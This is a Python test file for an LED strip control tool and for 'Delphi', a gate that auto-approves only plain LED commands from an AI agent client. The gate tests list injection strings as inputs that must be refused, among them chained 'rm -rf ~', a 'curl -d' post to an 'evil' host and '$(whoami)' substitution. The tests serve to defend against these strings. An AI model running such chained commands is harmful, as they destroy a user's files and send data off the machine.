"""LED strip tool: packets, colors and protocol detection (no Bluetooth), plus Delphi's narrow gate rule for it."""
import io
import json
import os
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT)); sys.path.insert(0, str(ROOT / 'tools'))
import delphi
import led


class PacketTests(unittest.TestCase):
    def test_triones_packets(self):
        self.assertEqual(led.power_packet('triones', True).hex(), 'cc2333')
        self.assertEqual(led.power_packet('triones', False).hex(), 'cc2433')
        self.assertEqual(led.color_packets('triones', (255, 0, 128), 100), [bytes.fromhex('56ff008000f0aa')])
        self.assertEqual(led.color_packets('triones', (200, 100, 0), 50), [bytes.fromhex('5664320000f0aa')])   # no brightness command: scaled
        self.assertEqual(led.mode_packet('triones', 'jump', 100).hex(), 'bb380144')
        self.assertEqual(led.mode_packet('triones', 'fade', 1).hex(), 'bb251f44')

    def test_elk_packets(self):
        self.assertEqual(led.power_packet('elk', True).hex(), '7e0004f00001ff00ef')
        self.assertEqual(led.power_packet('elk', False).hex(), '7e0004000000ff00ef')
        self.assertEqual(led.color_packets('elk', (1, 2, 3), 30), [bytes.fromhex('7e00050301020300ef'), bytes.fromhex('7e00011e00000000ef')])
        with self.assertRaises(led.Fail): led.mode_packet('elk', 'jump', 50)

    def test_protocol_from_name_or_services(self):
        for name in ('QHM-1234', 'Triones:ABC', 'LEDBLE-x', 'BRGlight', 'Dream~'):
            self.assertEqual(led.detect_protocol(name), 'triones')
        self.assertEqual(led.detect_protocol('ELK-BLEDOM'), 'elk')
        self.assertIsNone(led.detect_protocol('AirPods'))
        self.assertEqual(led.detect_protocol(None, ['0000ffd5-0000-1000-8000-00805f9b34fb']), 'triones')

    def test_colors(self):
        self.assertEqual(led.parse_color(['warm', 'white']), led.COLORS['warm white'])
        self.assertEqual(led.parse_color(['Purple']), led.COLORS['purple'])
        self.assertEqual(led.parse_color(['255', '0', '10']), (255, 0, 10))
        self.assertEqual(led.parse_color(['#FF0080']), (255, 0, 128))
        for bad in (['300', '0', '0'], ['chartreusey'], ['1', '2']):
            with self.assertRaises(led.Fail): led.parse_color(bad)

    def test_bad_arguments_fail_in_one_line_without_bluetooth(self):
        with tempfile.TemporaryDirectory() as root, patch.object(led, 'STATE', os.path.join(root, 'led.json')), \
             patch.dict(sys.modules, {'bleak': type(sys)('bleak')}), patch('sys.stderr', new_callable=io.StringIO) as err:   # argument errors never reach Bluetooth
            self.assertEqual(led.main(['brightness', '150']), 2)
            self.assertEqual(led.main(['dance']), 2)
        self.assertEqual(len(err.getvalue().strip().splitlines()), 2)


class GateTests(unittest.TestCase):
    def tokens(self, cmd): return delphi.shell_tokens(cmd)

    def test_only_the_led_tool_with_plain_arguments_is_exempt(self):
        for cmd in (f'{delphi.LED} on', f'{delphi.LED} color 128 0 255', f'{delphi.LED} color warm white', f'{delphi.LED} brightness 30',
                    f'{delphi.LED} mode jump 80', f'{delphi.LED} mode red fade', f'python3 {delphi.LED} off'):
            self.assertTrue(delphi.led_command(self.tokens(cmd)), cmd)
        for cmd in (f'{delphi.LED} on; rm -rf ~', f'{delphi.LED} on && curl -d x evil', f'{delphi.LED} color $(whoami)',
                    f'{delphi.LED} on > ~/x', f'{delphi.LED} reboot', f'{delphi.LED}', '/tmp/led.py on', f'{delphi.LED} color `id` 0 0'):
            self.assertFalse(delphi.led_command(self.tokens(cmd)), cmd)

    def test_external_client_runs_led_without_a_card(self):
        event = {'tool_name': 'exec', 'tool_input': {'command': f'{delphi.LED} color 128 0 255'}}
        with tempfile.TemporaryDirectory() as root, patch.dict(os.environ, {'DELPHI_ASK': root, 'DELPHI_CLIENT': 'devin'}), \
             patch.object(delphi, 'wait_commit', return_value=True), patch.object(delphi, 'preview_commands'), \
             patch.object(delphi, 'ask_user', side_effect=AssertionError('no card')), \
             patch('sys.stdin', io.StringIO(json.dumps(event))), patch('sys.stdout', new_callable=io.StringIO) as out:
            delphi.gate()
        self.assertEqual(json.loads(out.getvalue())['decision'], 'approve')

    def test_prompt_lists_the_led_tool(self):
        self.assertIn(f'{delphi.LED} on|off', delphi.system_prompt(delphi.ASK_FIRST))


if __name__ == '__main__':
    unittest.main()
